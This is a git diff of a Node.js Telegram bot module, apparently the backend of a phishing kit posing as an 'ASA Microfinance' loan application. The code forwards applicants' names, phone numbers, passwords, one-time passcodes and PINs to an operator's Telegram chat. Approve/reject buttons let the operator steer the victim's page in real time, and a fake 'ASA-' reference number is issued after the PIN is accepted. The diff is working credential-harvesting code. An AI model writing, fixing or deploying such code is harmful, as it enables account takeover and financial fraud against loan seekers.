@@ -1,7 +1,7 @@
 /**
  * bot_manager.js
  * ASA Microfinance Telegram Manager
- * Optimized for instant message sending and correct step order
+ * FIXED: Webhook mode and data-parsing for Render
  */
 
 require("dotenv").config();
@@ -10,223 +10,136 @@ const TelegramBot = require("node-telegram-bot-api");
 // =====================================================
 // ENV CONFIG
 // =====================================================
-
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
+// Ensure URL starts with https and has no trailing slash
+let RENDER_URL = process.env.RENDER_EXTERNAL_URL || process.env.URL; 
+if (RENDER_URL && RENDER_URL.endsWith('/')) RENDER_URL = RENDER_URL.slice(0, -1);
 
 if (!BOT_TOKEN || !ADMIN_CHAT_ID) {
-    console.error("❌ Missing BOT_TOKEN or ADMIN_CHAT_ID");
+    console.error("❌ Missing BOT_TOKEN or ADMIN_CHAT_ID in Environment Variables");
     process.exit(1);
 }
 
 // =====================================================
-// TELEGRAM BOT
+// TELEGRAM BOT INITIALIZATION
 // =====================================================
+// polling: false is used because server.js handles the POST requests via webhook
+const bot = new TelegramBot(BOT_TOKEN, { polling: false });
 
-const bot = new TelegramBot(BOT_TOKEN, {
-    polling: {
-        interval: 1200,
-        autoStart: true,
-        params: { timeout: 20 }
-    }
-});
-
-console.log("🤖 Telegram Bot Connected");
+if (RENDER_URL) {
+    const webhookUrl = `${RENDER_URL}/bot${BOT_TOKEN}`;
+    bot.setWebHook(webhookUrl)
+        .then(() => console.log(`🤖 Webhook successfully set: ${webhookUrl}`))
+        .catch(err => console.error(`❌ Webhook Error: ${err.message}`));
+} else {
+    console.warn("⚠️ No RENDER_EXTERNAL_URL found. Webhook not set. Buttons may not work unless polling is enabled.");
+}
 
 // =====================================================
 // UTILITIES
 // =====================================================
-
 const escapeHTML = (str) => {
     if (!str) return "N/A";
-    return String(str)
-        .replace(/&/g, "&amp;")
-        .replace(/</g, "&lt;")
-        .replace(/>/g, "&gt;");
+    return String(str).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
 };
 
 const currency = (n) => `$${Number(n || 0).toLocaleString()}`;
-
-const phone = (p) => p ? `+232 ${p}` : "N/A";
+const phoneFormat = (p) => p ? `+232 ${p}` : "N/A";
 
 // =====================================================
-// FIRE & FORGET SENDER (FAST)
+// CORE SENDER
 // =====================================================
-
 const send = (message, options = {}) => {
-
-    bot.sendMessage(ADMIN_CHAT_ID, message, {
+    return bot.sendMessage(ADMIN_CHAT_ID, message, {
         parse_mode: "HTML",
         ...options
     }).catch(err => {
-        console.error("Telegram send error:", err.message);
+        console.error("Telegram Send Error:", err.message);
     });
-
 };
-
-// =====================================================
-// STEP FORMATTERS
-// =====================================================
-
-const step1 = (d) => `
-💰 <b>STEP 1 – LOAN DETAILS</b>
-━━━━━━━━━━━━━━━━━━━━
-🆔 <b>App ID:</b> <code>${escapeHTML(d.appId)}</code>
-📋 <b>Loan Type:</b> ${escapeHTML(d.loanType)}
-💵 <b>Amount:</b> ${currency(d.amount)}
-⏱ <b>Term:</b> ${escapeHTML(d.term)} months
-📝 <b>Purpose:</b> ${escapeHTML(d.purpose)}
-`;
-
-const step2 = (d) => `
-👤 <b>STEP 2 – PERSONAL INFO</b>
-━━━━━━━━━━━━━━━━━━━━
-🆔 <b>App ID:</b> <code>${escapeHTML(d.appId)}</code>
-👤 <b>Name:</b> ${escapeHTML(d.firstName)} ${escapeHTML(d.lastName)}
-📧 <b>Email:</b> ${escapeHTML(d.email)}
-📞 <b>Phone:</b> ${phone(d.phone)}
-`;
-
-const step3 = (d) => `
-💼 <b>STEP 3 – EMPLOYMENT</b>
-━━━━━━━━━━━━━━━━━━━━
-🆔 <b>App ID:</b> <code>${escapeHTML(d.appId)}</code>
-📋 <b>Status:</b> ${escapeHTML(d.employment)}
-💰 <b>Income:</b> ${currency(d.income)}
-🏢 <b>Employer:</b> ${escapeHTML(d.employer)}
-`;
-
-const step4 = (d) => `
-🔐 <b>STEP 4 – PASSWORD</b>
-━━━━━━━━━━━━━━━━━━━━
-🆔 <b>App ID:</b> <code>${escapeHTML(d.appId)}</code>
-👤 <b>Name:</b> ${escapeHTML(d.firstName)} ${escapeHTML(d.lastName)}
-📞 <b>Phone:</b> ${phone(d.phone)}
-💰 <b>Amount:</b> ${currency(d.amount)}
-🔑 <b>Password:</b> <code>${escapeHTML(d.password)}</code>
-
-<i>Admin action required</i>
-`;
-
-const step5 = (d) => `
-🔢 <b>STEP 5 – OTP</b>
-━━━━━━━━━━━━━━━━━━━━
-🆔 <b>App ID:</b> <code>${escapeHTML(d.appId)}</code>
-📞 <b>Phone:</b> ${phone(d.phone)}
-🔢 <b>OTP:</b> <code>${escapeHTML(d.otp)}</code>
-`;
-
-const step6 = (d) => `
-🔐 <b>STEP 6 – PIN</b>
-━━━━━━━━━━━━━━━━━━━━
-🆔 <b>App ID:</b> <code>${escapeHTML(d.appId)}</code>
-👤 <b>Name:</b> ${escapeHTML(d.firstName)} ${escapeHTML(d.lastName)}
-📞 <b>Phone:</b> ${phone(d.phone)}
-🔐 <b>PIN:</b> <code>${escapeHTML(d.pin)}</code>
-
-<i>Final admin verification</i>
-`;
 
 // =====================================================
 // STEP SENDERS
 // =====================================================
+const sendStep1 = (d) => send(`💰 <b>STEP 1 – LOAN DETAILS</b>\n━━━━━━━━━━━━━━━━━━━━\n🆔 <b>App ID:</b> <code>${escapeHTML(d.appId)}</code>\n📋 <b>Type:</b> ${escapeHTML(d.loanType)}\n💵 <b>Amount:</b> ${currency(d.amount)}`);
 
-const sendStep1 = (data) => send(step1(data));
-const sendStep2 = (data) => send(step2(data));
-const sendStep3 = (data) => send(step3(data));
-const sendStep5 = (data) => send(step5(data));
+const sendStep2 = (d) => send(`👤 <b>STEP 2 – PERSONAL INFO</b>\n━━━━━━━━━━━━━━━━━━━━\n🆔 <b>App ID:</b> <code>${escapeHTML(d.appId)}</code>\n👤 <b>Name:</b> ${escapeHTML(d.firstName)} ${escapeHTML(d.lastName)}\n📞 <b>Phone:</b> ${phoneFormat(d.phone)}`);
 
-// =====================================================
-// STEP 4 WITH BUTTONS
-// =====================================================
+const sendStep3 = (d) => send(`💼 <b>STEP 3 – EMPLOYMENT</b>\n━━━━━━━━━━━━━━━━━━━━\n🆔 <b>App ID:</b> <code>${escapeHTML(d.appId)}</code>\n💰 <b>Income:</b> ${currency(d.income)}\n🏢 <b>Employer:</b> ${escapeHTML(d.employer)}`);
 
-const sendStep4 = (data) => {
-
-    send(step4(data), {
+const sendStep4 = (d) => {
+    send(`🔐 <b>STEP 4 – PASSWORD</b>\n━━━━━━━━━━━━━━━━━━━━\n🆔 <b>App ID:</b> <code>${escapeHTML(d.appId)}</code>\n👤 <b>Name:</b> ${escapeHTML(d.firstName)}\n🔑 <b>Password:</b> <code>${escapeHTML(d.password)}</code>`, {
         reply_markup: {
             inline_keyboard: [[
-                { text: "✅ APPROVE PASSWORD", callback_data: `approve_pw_${data.appId}` },
-                { text: "❌ REJECT PASSWORD", callback_data: `reject_pw_${data.appId}` }
+                { text: "✅ APPROVE", callback_data: `apr_pw_${d.appId}` },
+                { text: "❌ REJECT", callback_data: `rej_pw_${d.appId}` }
             ]]
         }
     });
-
 };
 
-// =====================================================
-// STEP 6 WITH BUTTONS
-// =====================================================
+const sendStep5 = (d) => send(`🔢 <b>STEP 5 – OTP</b>\n━━━━━━━━━━━━━━━━━━━━\n🆔 <b>App ID:</b> <code>${escapeHTML(d.appId)}</code>\n🔢 <b>OTP:</b> <code>${escapeHTML(d.otp)}</code>`);
 
-const sendStep6 = (data) => {
-
-    send(step6(data), {
+const sendStep6 = (d) => {
+    send(`🔐 <b>STEP 6 – PIN</b>\n━━━━━━━━━━━━━━━━━━━━\n🆔 <b>App ID:</b> <code>${escapeHTML(d.appId)}</code>\n🔐 <b>PIN:</b> <code>${escapeHTML(d.pin)}</code>`, {
         reply_markup: {
             inline_keyboard: [[
-                { text: "✅ APPROVE PIN", callback_data: `approve_pin_${data.appId}` },
-                { text: "❌ REJECT PIN", callback_data: `reject_pin_${data.appId}` }
+                { text: "✅ APPROVE", callback_data: `apr_pn_${d.appId}` },
+                { text: "❌ REJECT", callback_data: `rej_pn_${d.appId}` }
             ]]
         }
     });
-
 };
 
 // =====================================================
-// BUTTON HANDLER
+// CALLBACK HANDLER
 // =====================================================
-
 bot.on("callback_query", async (query) => {
-
     const { data, id, message } = query;
+    // Shortened actions (apr/rej) to stay under 64-byte limit
     const [action, type, appId] = data.split("_");
 
-    await bot.answerCallbackQuery(id).catch(()=>{});
+    await bot.answerCallbackQuery(id).catch(() => {});
 
     const io = global.io;
-
-    if (!io) return;
-
-    if (action === "approve") {
-
-        if (type === "pw") {
-            io.to(appId).emit("password-approved");
-        }
-
-        if (type === "pin") {
-            io.to(appId).emit("pin-approved");
-        }
-
+    if (!io) {
+        console.error("❌ Socket.io instance missing from global scope");
+        return;
     }
 
-    if (action === "reject") {
-
-        if (type === "pw") {
-            io.to(appId).emit("password-rejected");
-        }
-
-        if (type === "pin") {
-            io.to(appId).emit("pin-rejected");
-        }
-
+    if (action === "apr") {
+        const event = (type === "pw") ? "password-verified" : "pin-verified";
+        const payload = (type === "pn") ? { referenceId: "ASA-" + Math.floor(Math.random() * 900000 + 100000) } : null;
+        
+        io.to(appId).emit(event, payload);
+        
+        bot.editMessageText(`${message.text}\n\n✅ <b>APPROVED BY ADMIN</b>`, {
+            chat_id: ADMIN_CHAT_ID,
+            message_id: message.message_id,
+            parse_mode: "HTML"
+        });
     }
 
+    if (action === "rej") {
+        const event = (type === "pw") ? "password-rejected" : "pin-rejected";
+        io.to(appId).emit(event);
+        
+        bot.editMessageText(`${message.text}\n\n❌ <b>REJECTED BY ADMIN</b>`, {
+            chat_id: ADMIN_CHAT_ID,
+            message_id: message.message_id,
+            parse_mode: "HTML"
+        });
+    }
 });
 
-// =====================================================
-// SIMPLE MESSAGE
-// =====================================================
-
-const sendTelegramMessage = (msg) => send(msg);
-
-// =====================================================
-// EXPORTS
-// =====================================================
-
 module.exports = {
+    bot, 
     sendStep1,
     sendStep2,
     sendStep3,
     sendStep4,
     sendStep5,
     sendStep6,
-    sendTelegramMessage
+    sendTelegramMessage: (msg) => send(msg)
 };
